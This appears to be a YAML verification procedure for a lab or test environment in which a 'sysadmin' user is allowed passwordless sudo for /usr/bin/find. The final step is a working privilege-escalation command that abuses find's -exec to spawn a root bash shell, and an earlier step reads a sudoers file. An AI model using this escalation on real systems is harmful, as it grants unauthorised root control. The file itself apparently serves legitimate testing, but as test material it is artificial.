procedure:
- action:
    command: id sysadmin
    type: exec_target
  expect:
    stdout_contains: sysadmin
  outputs: {}
  session: null
  step_id: verify_sysadmin_exists
  timeout: 10
- action:
    command: cat /etc/sudoers.d/sysadmin
    type: exec_target
  expect:
    stdout_contains: 'NOPASSWD: /usr/bin/find'
  outputs: {}
  session: null
  step_id: verify_sudoers_entry
  timeout: 10
- action:
    command: sudo -u sysadmin sudo /usr/bin/find /. -maxdepth 0 -exec /bin/bash -p
      -c 'id' \; -quit
    type: exec_target
  expect:
    stdout_contains: uid=0(root)
  outputs: {}
  session: null
  step_id: exploit_sudo_find
  timeout: 15
sessions: []
